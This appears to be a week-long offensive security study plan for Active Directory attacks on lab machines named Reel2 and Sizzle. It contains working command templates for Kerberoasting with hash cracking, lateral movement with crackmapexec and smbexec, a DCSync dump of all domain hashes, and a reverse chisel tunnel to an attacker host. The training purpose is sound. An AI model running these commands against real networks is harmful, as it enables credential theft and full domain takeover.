# 🏰 Week 9: Active Directory Pt. II — Kerberoasting, DCSync, Pivoting

> _“You’re not in the domain. You are consuming it. One credential. One path. One pivot at a time.”_

---

## 🎯 Mission Objectives

- Perform Kerberoasting and crack service account hashes
    
- Execute a DCSync attack to extract full domain password hashes
    
- Move laterally between machines using cracked credentials
    
- Use tunnels (e.g., `chisel`) to pivot into internal networks
    
- Own and fully document complete domain compromise
    

---

## 🛠 Tools Required

- `GetUserSPNs.py` (Kerberoasting)
    
- `secretsdump.py` (DCSync)
    
- `crackmapexec`, `smbexec.py`, `wmiexec.py`
    
- `BloodHound + neo4j`
    
- `john`, `rockyou.txt`
    
- `chisel` (or `ssh -L`)
    
- (Optional: `Rubeus`, `PowerView.ps1`)
    

---

## 💻 Capstone Machines

|Machine|Tactics Practiced|
|---|---|
|**Reel2**|Kerberoasting, lateral movement|
|**Sizzle**|DCSync, domain root, pivoting|

---

## 🗓 Day-by-Day Strategy

---

### 📅 Monday — Kerberoasting

**Goals:**

- Extract TGS tickets for crackable service accounts
    

**Actions:**

bash

CopyEdit

`GetUserSPNs.py -request bluelock.local/user:pass john spn.hashes --wordlist=/usr/share/wordlists/rockyou.txt`

**Outcome:**

- Identify cracked user
    
- Determine where they have access
    
- Log all output to `kerberoast-log.md`
    

---

### 📅 Tuesday — Lateral Movement

**Goals:**

- Use newly cracked creds to move between systems
    

**Actions:**

bash

CopyEdit

`crackmapexec smb 10.10.10.0/24 -u user -p pass smbexec.py domain/user@target`

**Outcome:**

- Get SYSTEM shell
    
- Note which machines are accessible with which credentials
    
- Log lateral steps in `movement-log.md`
    

---

### 📅 Wednesday — DCSync Attack

**Goals:**

- Extract NTLM hashes from Domain Controller using Replication rights
    

**Actions:**

bash

CopyEdit

`secretsdump.py domain.local/user:pass@dc-ip`

**Outcome:**

- Retrieve all domain hashes
    
- Identify `Administrator`, `krbtgt`, and other high-value targets
    
- Save hashes to `ntdsdump.txt`
    

---

### 📅 Thursday — Pivoting

**Goals:**

- Reach internal hosts using tunnels
    

**Actions:**

bash

CopyEdit

`# Start server on attacker ./chisel server -p 9001 --reverse  # Client on foothold chisel client attacker:9001 R:9999:internal:445`

Or with SSH:

bash

CopyEdit

`ssh -L 9999:internal:445 user@pivot`

**Outcome:**

- Access a service behind firewall or NAT
    
- Log process and network structure in `pivot-map.md`
    

---

### 📅 Friday — Root Reel2

**Focus:**

- Crack SPN → reuse → escalate via local misconfig
    
- Use BloodHound to guide privilege paths
    

**Deliverables:**

- `reel2-report.md`
    
- Include: how you got creds, how you moved laterally, how you got root
    

---

### 📅 Saturday — Root Sizzle

**Focus:**

- DCSync from foothold or after lateral pivot
    
- Gain full domain controller control
    

**Deliverables:**

- `sizzle-report.md`
    
- Include BloodHound path + pivot method used + any additional access
    

---

### 📅 Sunday — Reflection & Cheat Build

**Goals:**

- Solidify full attack chain into repeatable reference
    

**Actions:**

- Build `ad-attacks-cheatsheet.md`:
    
    - Kerberoasting commands
        
    - DCSync steps
        
    - Crackmap lateral movement chains
        
    - Pivoting syntax
        
- Update:
    
    - `notes.md`
        
    - `ego-log.md` with:
        
        - What broke first?
            
        - How did you fix it?
            
        - What will you remember next time?
            

---

## ✅ Week 9 Final Checklist

-  SPNs extracted and at least one cracked
    
-  SYSTEM access achieved on at least one machine
    
-  DCSync performed and hashes extracted
    
-  Successfully pivoted via tunnel
    
-  Rooted **Reel2** and **Sizzle**
    
-  Cheat sheet + 2 full reports written
    
-  Ego log + notes updated with reflections